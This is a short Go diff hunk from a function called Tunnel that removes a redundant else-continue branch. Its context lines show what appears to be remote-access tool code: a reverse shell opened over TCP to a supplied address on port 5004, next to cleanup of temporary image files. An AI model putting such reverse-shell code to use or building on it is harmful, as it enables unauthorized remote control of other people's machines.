@@ -68,8 +68,6 @@ func Tunnel(addr string) {
 						go lib.Removetempimages(filenames, finflag)
 					}
 					reverse.CreateRevShell("tcp", addr+":5004")
-				} else {
-					continue
 				}
 			}
 		}
